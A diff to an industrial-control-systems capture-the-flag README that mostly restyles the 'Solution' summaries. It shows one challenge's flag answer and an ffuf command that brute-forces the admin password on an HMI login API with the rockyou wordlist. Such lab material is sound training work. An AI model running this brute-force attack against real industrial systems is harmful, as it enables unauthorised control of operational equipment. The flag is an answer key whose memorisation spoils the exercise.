@@ -50,7 +50,7 @@ The flag has the format "CybICS(flag)".
 
 **Hint**: The flag is part of the user information.
 <details>
-  <summary>Solution</summary>
+  <summary><strong><span style="color:orange;font-weight: 900">Solution</span></strong></summary>
   
   ##
   :anger: Flag: CybICS(0penPLC)
@@ -66,7 +66,8 @@ The flag has the format "CybICS(flag)".
 
 **Hint**: The flag appears after successful login on the HMI.
 <details>
-
+  <summary><strong><span style="color:orange;font-weight: 900">Solution</span></strong></summary>
+  
 ```sh
 ./ffuf -v -w ./rockyou.txt -X POST -H "Content-Type: application/json" -d '{"username": "admin", "password": "FUZZ"}' -raw -u http://$DEVICE_IP:1881/api/signin -fr "error"
 ```
